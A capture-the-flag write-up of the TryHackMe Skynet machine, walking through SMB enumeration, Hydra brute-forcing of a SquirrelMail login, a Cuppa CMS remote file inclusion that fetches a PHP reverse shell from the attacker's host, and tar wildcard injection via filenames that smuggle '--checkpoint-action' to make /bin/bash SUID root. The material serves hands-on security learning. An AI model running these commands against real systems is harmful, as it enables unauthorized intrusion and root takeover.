---
layout: post
title: THM Skynet WriteUp
date: 2025-01-10
categories:
  - TryHackMe
  - TryHackMe-Linux
tags:
  - CTF
  - TryHackMe
  - OSCP
  - SMB-Anon-Allowed
  - HTTP-Brute-Force
  - Fuzzing
  - Credentials-Leakage
  - Remote-File-Inclusion
  - CuppaCMS
  - Wildcard-Injection
media_subpath: /assets/img/Skynet
---
![Desktop View](Skynet.jpeg){: w="400"  h="400" }



# Skynet Skills


>**Skynet** is an easy Linux machine where we will use the following skills:

-  **Port Discovery**
-  **Web Tech's Enumeration**
- **SMB Anonymous User Allowed**
- **Web Fuzzing**
- **HTTP Post Brute-Forcing**
- **Remote File Inclusion**
- **Wildcard Injection**

---
## IP Address Enumeration

Using the usual `nmap` scan I've discovered port **22, 80, 110, 139, 143** & port **445**:

```perl
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.201.231 -oG allPorts
Nmap scan report for 10.10.201.231
Host is up, received user-set (0.12s latency).
Scanned at 2025-01-09 23:23:48 CET for 17s
Not shown: 64713 closed tcp ports (reset), 816 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 63
80/tcp  open  http         syn-ack ttl 63
110/tcp open  pop3         syn-ack ttl 63
139/tcp open  netbios-ssn  syn-ack ttl 63
143/tcp open  imap         syn-ack ttl 63
445/tcp open  microsoft-ds syn-ack ttl 63
```

Then i launched a basic group of scripts to seek more info from the open ports:

```java
❯ nmap -sCV -p22,80,110,139,143,445 10.10.201.231 -oN targeted
Nmap scan report for 10.10.201.231
Host is up (0.084s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Skynet
|_http-server-header: Apache/2.4.18 (Ubuntu)
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: PIPELINING SASL AUTH-RESP-CODE RESP-CODES UIDL TOP CAPA
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: LOGIN-REFERRALS LITERAL+ capabilities have post-login LOGINDISABLEDA0001 listed more ID IMAP4rev1 Pre-login IDLE SASL-IR OK ENABLE
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2025-01-09T16:27:48-06:00
|_clock-skew: mean: 2h00m00s, deviation: 3h27m51s, median: 0s
| smb2-time: 
|   date: 2025-01-09T22:27:48
|_  start_date: N/A
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

So we have to check the following ports & services:

- **Port 22 --> OpenSSH 7.2p2 Ubuntu 4ubuntu2.8**
- **Port 80 --> Apache httpd 2.4.18**
- **Port 110 --> Dovecot pop3d**
- **Port 139 --> netbios-ssn Samba smbd 3.X - 4.X**
- **Port 143 --> Dovecot imapd**
- **Port 445 --> netbios-ssn Samba smbd 4.3.11-Ubuntu**


Let's start with the Apache web server.

---
## Port 80 Enumeration

At first i ran `whatweb`,  to seek for some versions and technologies used in the website:

```bash
❯ whatweb 10.10.201.231
http://10.10.201.231 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.201.231], Title[Skynet]
```

Nothing useful found, so let's take a look inside the website, once inside ***http://10.10.201.231***, we found a search engine that seems useless.

![Desktop View](SkynetMainPage.png)

Nothing in the source code also, so let's check the next service.

---
## Port 445 Enumeration

We could check `pop3` service first but usually `Samba` give more valuable info, so let's start with a `nmap` scan.

```bash
❯ nmap --script="smb-enum-shares,smb-enum-users,smb-os-discovery,smb-vuln*" -p445 10.10.201.231 -oN smbScan
Nmap scan report for 10.10.201.231
Host is up (0.11s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: false
|_smb-vuln-ms10-054: false
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.201.231\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (skynet server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.201.231\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: Skynet Anonymous Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\srv\samba
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.201.231\milesdyson: 
|     Type: STYPE_DISKTREE
|     Comment: Miles Dyson Personal Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\milesdyson\share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.201.231\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2025-01-09T16:38:24-06:00
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          
| smb-enum-users: 
|   SKYNET\milesdyson (RID: 1000)
|     Full name:   
|     Description: 
|_    Flags:       Normal user account
```

Thanks to this scan we see that we can access some of the shares anonymously and that is vulnerable to a **DOS** vulnerability.

So, let's check both of the available shares:`IPC$` & `anonymous`.

```bash
❯ smbclient \\\\10.10.201.231\\IPC$ -N
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
```

The `IPC$` share is empty, let's check the `anonymous` share.

```bash
❯ smbclient \\\\10.10.201.231\\anonymous -N
smb: \> ls
  .                                   D        0  Thu Nov 26 17:04:00 2020
  ..                                  D        0  Tue Sep 17 09:20:17 2019
  attention.txt                       N      163  Wed Sep 18 05:04:59 2019
  logs                                D        0  Wed Sep 18 06:42:16 2019

		9204224 blocks of size 1024. 5831464 blocks available
```

This isn't empty, we found a file named `attention.txt` and a folder named `logs`.

Checking the `logs` folder, we found three log files, so let's download them to inspect them.

```bash
smb: \> get attention.txt
getting file \attention.txt of size 163 as attention.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
```

```bash
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 06:42:16 2019
  ..                                  D        0  Thu Nov 26 17:04:00 2020
  log2.txt                            N        0  Wed Sep 18 06:42:13 2019
  log1.txt                            N      471  Wed Sep 18 06:41:59 2019
  log3.txt                            N        0  Wed Sep 18 06:42:16 2019

		9204224 blocks of size 1024. 5831464 blocks available

smb: \> prompt off
smb: \logs\> mget *
getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 0.2 KiloBytes/sec)
getting file \logs\log1.txt of size 471 as log1.txt (1.3 KiloBytes/sec) (average 0.6 KiloBytes/sec)
getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 0.5 KiloBytes/sec)
```

Once with the files locally stored, we can check file per file looking for valuable information, 

The files with valuable information are `attention.txt` & `logs1.txt`

```bash
❯ catn attention.txt
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

Inside the `attention.txt` file we can find a feasible user, named `miles` or `milesdyson` and that all **Skynet** employees are requires to change their password.

```bash
❯ catn log1.txt
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

In the `log1.txt` we can see what looks like to be a potential password credentials.

So i tried to brute-force the `Samba` service with this wordlist but it didn't work either with user `miles` & `milesdyson`.

```bash
❯ hydra -l milesdyson -P ../content/log1.txt smb://10.10.201.231
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-10 00:03:56
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 31 login tries (l:1/p:31), ~31 tries per task
[DATA] attacking smb://10.10.201.231:445/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-10 00:04:05
```

So, i suppose that we might can use them in other service, i wanted to check if there is any hidden folder under the `Apache` service.

---
## Port 80 Exploitation

I started using `gobuster` in order to detect any hidden folder.

```bash
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.201.231 -t 64 --follow-redirect
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.201.231
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/admin                (Status: 403) [Size: 278]
/ai                   (Status: 403) [Size: 278]
/config               (Status: 403) [Size: 278]
/css                  (Status: 403) [Size: 278]
/js                   (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
/squirrelmail         (Status: 200) [Size: 2912]
Progress: 20478 / 20479 (100.00%)
===============================================================
Finished
===============================================================
```

After finishing the fuzz, i found multiple directories  with a **(403)** status code (**Forbbidden**) and one directory named `/squirrelmail` with  a **(200 OK)** status code, so let's check the `/squirrelmail` directory.

Once inside we can see a **Webmail** service named **Squirrelmail** that asks us for credentials.

![Desktop View](SkynetMainPage.png)

Running `whatweb` i found the version of the web-mail service.

```bash
❯ whatweb http://10.10.201.231/squirrelmail/
http://10.10.201.231/squirrelmail/ [302 Found] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.201.231], RedirectLocation[src/login.php]
http://10.10.201.231/squirrelmail/src/login.php [200 OK] Apache[2.4.18], Cookies[SQMSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], HttpOnly[SQMSESSID], IP[10.10.201.231], PasswordField[secretkey], Script[JavaScript,text/javascript], SquirrelMail[1.4.23 [SVN]], Title[SquirrelMail - Login], X-Frame-Options[SAMEORIGIN]
```

We can see that we are against a `SquirrelMail[1.4.23 [SVN]]` web-mail version, checking in `searchsploit` we can't find any exploit available for this version.

```bash
❯ searchsploit squirrelmail 1.4
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
SquirrelMail 1.4.2 Address Add Plugin - 'add.php' Cross-Site Scripting                                                                                  | php/webapps/26305.txt
Squirrelmail 1.4.x - 'Redirect.php' Local File Inclusion                                                                                                | php/webapps/27948.txt
SquirrelMail 1.4.x - Folder Name Cross-Site Scripting                                                                                                   | php/webapps/24068.txt
SquirrelMail < 1.4.22 - Remote Code Execution                                                                                                           | linux/remote/41910.sh
SquirrelMail < 1.4.5-RC1 - Arbitrary Variable Overwrite                                                                                                 | php/webapps/43830.txt
SquirrelMail < 1.4.7 - Arbitrary Variable Overwrite                                                                                                     | php/webapps/43839.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

But we can try to brute-force this login form with the known user `milesdyson` and the wordlist we got from the `Samba` service, we can perform this using `hydra`.

```bash
❯ hydra -l milesdyson -P log1.txt 10.10.201.231 http-post-form "/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect."

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-10 00:23:38
[DATA] max 16 tasks per 1 server, overall 16 tasks, 31 login tries (l:1/p:31), ~2 tries per task
[DATA] attacking http-post-form://10.10.201.231:80/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect.
[80][http-post-form] host: 10.10.201.231   login: milesdyson   password: cyborg007haloterminator
1 of 1 target successfully completed, 1 valid password found
```

Bingo, we got valid credentials, `milesdyson:cyborg007haloterminator`.

After log in via browser, we can see an e-mail inbox with three mails.

![Desktop View](SkynetMailInbox.png)

We can see that one of the mails seems quite interesting, it shows a subject named `Samba Password reset`.

After getting inside we can see a text that tell us that our `SMB` password has been changed due to a system malfunction and give us our new valid password.

```bash
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

So let's check if we can get inside of the other shares in the `Samba` service.

---
## Port 445 Exploitation

Let's log in with our new credentials.

```bash
❯ smbclient \\\\10.10.201.231\\milesdyson -U milesdyson
Password for [WORKGROUP\milesdyson]: )s{A&2Z=F^n_E.B`
Try "help" to get a list of possible commands.
smb: \>
```

The credentials where valid and we gained access to the restricted shares, let's seek for any interesting files.

After browsing a bit, this share looks like a note taking share, but i found a `.txt` file named `important.txt`.

```bash
smb: \> cd notes\
smb: \notes\> get important.txt 
getting file \notes\important.txt of size 117 as important.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```

Once downloaded, we can open it.

```bash
❯ catn important.txt

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

I found a beta CMS hosted in a hidden directory named `/45kra24zxs28v3yd`, let's check it.

---
## Getting a Shell

After getting inside the new directory we found a basic website just hosting a image and plain text, nothing in the source code either.

![Desktop View](SkynetMainPage3.png)

So, let's fuzz over the new directory again.

```bash
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.201.231/45kra24zxs28v3yd -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.201.231/45kra24zxs28v3yd
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/administrator        (Status: 301) [Size: 339] [--> http://10.10.201.231/45kra24zxs28v3yd/administrator/]
Progress: 20478 / 20479 (100.00%)
===============================================================
Finished
===============================================================
```

I found a directory named `/administrator`, let's see if we can access.

Before getting in via browser, let's check what `whatweb` have to tell.

```bash
❯ whatweb http://10.10.201.231/45kra24zxs28v3yd/administrator/
http://10.10.201.231/45kra24zxs28v3yd/administrator/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.201.231], JQuery, PasswordField[password], Script[text/javascript], Title[Cuppa CMS]
```

We can see in the `Title[Cuppa CMS]` field that we are in front of a `Cuppa CMS`.

Let's check it via browser.

![Desktop View](SkynetCMSLogin.png)

Indeed we are in front of a `Cuppa CMS`, at first i tried to login with or known credentials (**milesdyson**:**cyborg007haloterminator**) & (**milesdyson**:**)s{A&2Z=F^n_E.B**), but non of them worked.

So let's see if there is any publicly available exploit for this CMS.

```bash
❯ searchsploit cuppa
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                                                                                         | php/webapps/25971.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

After checking with `searchsploit` i found a File Inclusion exploit, so let's check how it works.

```bash
❯ searchsploit -m php/webapps/25971.txt
  Exploit: Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion
      URL: https://www.exploit-db.com/exploits/25971
     Path: /usr/share/exploitdb/exploits/php/webapps/25971.txt
    Codes: OSVDB-94101
 Verified: True
File Type: C++ source, ASCII text, with very long lines (876)
Copied to: /home/ne4rby/Documents/CTFs/SkyNet/content/25971.txt

❯ cat 25971.txt
```

After checking how the exploit works, i found that we can **inject PHP code** on account of a **Remote File Inclusion** (**RFI**) vulnerability.

We can host a **PHP Reverse Shell** and make the server interpret the file by using the following path `http://<TARGET-IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<LOCAL-IP>/shell.php`.

So let's start hosting the **PHP Reverse Shell**, if we are using **Kali** or **Parrot**  we can find the classic [Monkey Pentester PHP Reverse Shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) at `/usr/share/webshells/laudanum/php/php-reverse-shell.php`, so let's copy it to our current directory.

```bash
cp /usr/share/webshells/laudanum/php/php-reverse-shell.php .
```

Just modify your **IP Address** & **Port** in the code and it's ready to use, then we can host it using `python3`.

```bash
python3 -m http.server 80
```

Then let's set a `netcat` listener listening at port **443** 

```bash
nc -nvlp 443
```

Finally we can access the vulnerable path.

```bash
❯ curl -S "http://10.10.201.231/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.116.52/php-reverse-shell.php"
```

Checking the listener we already gained access to a shell.

```bash
❯ nc -nvlp 443
listening on [any] 443 ...
connect to [10.11.116.52] from (UNKNOWN) [10.10.201.231] 37256
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 18:29:47 up  2:18,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

---

## Shell as www-data

Once we get the reverse shell, let's find a way to scale privileges, but before, we have to get a fully interactive shell, there are multiple ways but i like to do it this way: 

```bash
script /dev/null -c bash
```

Then press *Ctrl+Z* to get the process in background.

Now that you are in your machine execute the next command:

```bash
stty raw -echo;fg
```

Now write `reset xterm` and you should have a better looking shell but you still have to execute a few commands:

```bash
export TERM=xterm
export SHELL=bash
stty rows 45 columns 184
```

Make a `stty size` in your own shell to know the rows and columns.

Now that we own a full TTY we can take a look to the `user.txt` flag.

```bash
bash-4.3$ cat user.txt 
7ce5c21*******95809******0a9ae807
```

For me this privilege escalation phase was so difficult, i never seen something like this, but it was so fun learning how to execute it.

After checking the common ways to **PrivEsc** nothing seems to work until i checked if there was any cron job.

```bash
www-data@skynet:/$ cat /etc/crontab 
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
*/1 *	* * *   root	/home/milesdyson/backups/backup.sh
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

There is a `bash` script at a folder named `backups` at **Miles** home directory, let's check what perms do we have.

```bash
www-data@skynet:/home/milesdyson/backups$ ls -l 
total 4576
-rwxr-xr-x 1 root root      74 Sep 17  2019 backup.sh
-rw-r--r-- 1 root root 4679680 Jan  9 18:41 backup.tgz
```

We can read & execute the `backup.sh` script, so let's see what it does.

```bash
www-data@skynet:/home/milesdyson/backups$ cat backup.sh 
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

It goes to `/var/www/html` and make a `.tgz` compressed file of all the contents of `/var/www/html` at  `/home/milesdyson/backups/backup.tgz`.

Here it comes why i found this **PrivEsc** that hard, we can't modify/impersonate any file/user, to execute arbitrary code as `root`.

The trick lies in using the wildcard (`*`) to include all files in a folder when running the `tar` command. In simple terms, we can create files with names that mimic `tar` command options, effectively injecting malicious parameters into the command. By leveraging two specific options, `--checkpoint` and `--checkpoint-action`, we can execute arbitrary commands. Let’s dive into a practical example to make it easier to understand.

At first we need to create two files named as the arguments we need to execute arbitrary commands.

```bash
echo "" > '--checkpoint=1'  
```

- Creates an empty file named `--checkpoint=1` to trigger a checkpoint after processing one file in `tar`.

```bash
echo "" > '--checkpoint-action=exec=sh privesc.sh'
```

- Creates an empty file named `--checkpoint-action=exec=sh privesc.sh`, which instructs `tar` to execute `sh privesc.sh` at the checkpoint.

 **Summary:** These commands create files that exploit `tar`'s `--checkpoint` and `--checkpoint-action` options to execute a privilege escalation script (`privesc.sh`).

What we have left to do is create the `privesc.sh` script to generate a way to gain `root` access, just create a file named `privesc.sh` and add the next content.

```bash
#!/bin/bash
chmod u+s /bin/bash
```

This will add **SUID** perms to the `bash` binary.

Now let's see what will happen when the cron job executes the script `backup.sh`, we just created files named as `tar` arguments.

So the command that `backup.sh` started running:

```bash
tar cf /home/milesdyson/backups/backup.tgz *
```

Actually looks like this:

```bash
tar cf /home/milesdyson/backups/backup.tgz --checkpoint-action=exec=sh privesc.sh admin	css js --checkpoint=1 ai image.png privesc.sh 45kra24zxs28v3yd config index.html style.css
```

Here you should see more clearly how it works, we are adding argumentes via file names.

Then once the cron job executes `backup.sh` again we should see that `/bin/bash` is flagged as **SUID**.

```bash
www-data@skynet:/var/www/html$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash
```

There we are, we now can spawn a privileged shell.

```bash
www-data@skynet:/var/www/html$ bash -p
bash-4.3# whoami
root
```

Finally we get a shell as root, let's take a look to the `root.txt` flag.

```bash
bash-4.3# cat root.txt 
3f0372db******ccc7179*****d6a949
```


---
## Final Thoughts

The **Skynet CTF** was a mix of approachable and challenging elements. While the exploitation phase was straightforward and enjoyable, the privilege escalation proved to be quite difficult for a beginner. However, tackling this unique Privesc method made the experience highly rewarding and a great opportunity to learn and grow.

![Desktop View](SKynetPwn.png)

-- -
**Thanks for reading, i’ll appreciate that you take a look to my other posts :)**

